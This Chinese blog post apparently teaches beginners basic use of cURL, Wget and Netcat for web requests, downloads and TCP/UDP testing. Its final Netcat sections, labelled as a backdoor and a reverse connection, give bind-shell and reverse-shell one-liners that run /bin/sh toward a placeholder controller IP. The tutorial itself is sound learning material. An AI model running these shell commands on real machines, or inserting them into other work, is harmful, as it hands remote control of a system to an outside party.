---
author: runner
date: 2017-04-06 20:50+08:00
layout: post
title: "网络调试工具：cURL、Wget和Netcat"
description: ""
comments : true
categories:
- 技术
tags:
- 网络工具
---
![](/blog/images/17040601.jpg)
# 0x00 前言

网络调试当中经常需要用到一些命令行工具，其中较为著名的是[cURL](https://curl.haxx.se/)、[Wget](https://www.gnu.org/software/wget/)和[Netcat](http://nc110.sourceforge.net/)三款跨平台工具。它们除了具有对网络通信进行分析之类的常规功能，甚至还有数据爬取、端口反弹等特殊功能，完全是居家旅行必备之良品。本文对cURL、Wget和Netcat三款工具的常见功能进行介绍，方便新手快速掌握这里命令行工具的基本选项与参数。

# 0x01 模拟请求利器cURL
支持的通信协议有FTP、FTPS、HTTP、HTTPS、IMAP、POP3、SMTP等。除了命令行工具，cURL还包含了用于程序开发的libcurl, 可以与许多语言相结合，如PHP、C++等。这里主要介绍cURL作为命令行工具在HTTP、HTTPS等协议中的运用。

<!--more-->

## 查看 www.qq.com 的网页源码
    curl www.qq.com

## 下载一张图片后保存到本地，并重命名logo.png
    curl -o logo.png  http://mat1.gtimg.com/www/images/qq2012/qqlogo_1x.png

## 查看HTTPS的网页源码
    curl https://www.baidu.com

## 忽略HTTPS的证书（以12306网站为例）
    curl https://kyfw.12306.cn/otn/ --insecure

## 重定向（3xx的HTTP状态码）的自动跳转，带-L参数
    curl -L www.sina.com

## 显示通信过程（显示http request与http response的首部信息）
    curl -v www.baidu.com

## OPTIONS、HEAD方法
    curl -X OPTIONS  www.sohu.com -v
    curl -X HEAD  www.sohu.com -v

## POST方法
    curl -X POST --data "data=xxx" "protocol://address:port/url"

## Referer字段
    curl --referer http://www.qq.com  http://www.sina.com
    
    对应的请求首部：
    > GET / HTTP/1.1
    > Host: www.sina.com
    > User-Agent: curl/7.47.1
    > Accept: */*
    > Referer: http://www.qq.com

## User Agent字段
    curl --user-agent "Mozilla/5.0  Chrome/57.0.2987.98 Safari/537.36"  www.baidu.com

## Cookie字段
    curl -v --cookie "name=VALUE" www.baidu.com

# 0x02 网络下载工具Wget
作为最著名的命令行下载工具，Wget的名字是“World Wide Web”和“Get”的结合，它支持通过HTTP、HTTPS，以及FTP这三个最常见的TCP/IP协议协议下载。

## 下载文件后重命名保存（-O选项后的参数指定文件名）
    wget http://www.baidu.com/img/bd_logo1.png -O new.png  

## 下载到本地指定的目录（下载目录是-P选项后的参数指定）
    wget http://www.baidu.com/img/bd_logo1.png -P mydir

## 忽略https证书进行下载
    wget --no-check-certificate   https://www.baidu.com -P mydir

## 通过下载清单进行下载（本地download_list.txt文件存放了一批URL）
    wget -i  download_list.txt  -P mydir

## 断点续传与超时重试（-c选项表示断点续传，-t选项表示重试次数，--timeout选项表示超时秒数）
    wget.exe -c   -t 5  --timeout=10   http://dldir1.qq.com/qqfile/qq/QQ8.9.1/20453/QQ8.9.1.exe  
    
    以断点续传的方式下载QQ，如果网络超时10秒就进行重试，重试5次；

## 下载限速（--limit-rate选项表示下载限速）
    wget.exe  --limit-rate=100k  http://dldir1.qq.com/qqfile/qq/QQ8.9.1/20453/QQ8.9.1.exe  

## 后台下载，并将下载日志实时保存到名为wget-log文件中
    wget.exe  -b  http://dldir1.qq.com/qqfile/qq/QQ8.9.1/20453/QQ8.9.1.exe  
    
    实时查看日志：tail -f wget-log

## 测试URL的有效性
    wget --spider http://dldir1.qq.com/qqfile/qq/QQ8.9.1/20453/QQ8.9.1.exe 

## 下载网站（-m选项表示镜像，-l表示递归层次）
    wget -m -p -k -H  -l 2    --execute robots=off  -P mydir http://www.pixgoo.com/

# 0x03 瑞士军刀Netcat
在网络工具中有“瑞士军刀”美誉的Netcat，可以对TCP，UDP协议进行测试，甚至可以用它对服务器进行远程控制。

## TCP测试
服务端： 监听TCP端口8000  

    nc -lp 8000 < 1.txt
    
1.txt 存放内容为

    HTTP/1.1 200 OK
    Content-Length: 21
    Content-Type: text/html
    
    <h1>Hello World!</h1>


客户端：    
浏览器中打开地址：http://服务端IP:8000/，可以直接看到来自服务端的HTML代码渲染后的页面。

## TCP测试2
    nc www.baidu.com 80

nc上输入下面的文本，并回车

    GET / HTTP/1.1
    Host: baidu.com

直接返回得到百度首页的HTML代码

## UDP测试
服务端： UDP端口1234 

    nc -lp 1234 -u

客户端：

    nc -u  服务端IP 1234

## 后门，远程控制服务器
被控端：在被控端打开端口1234

    nc -lp 1234 -e /bin/sh

主控端:

    nc 被控端IP  1234

## 反向连接，端口反弹
主控端：在主控端打开端口1234

    nc -lp 1234

被控端：

    nc  主控端IP 1234  -e /bin/sh


**注：如需转载这篇文章请注明出处**  




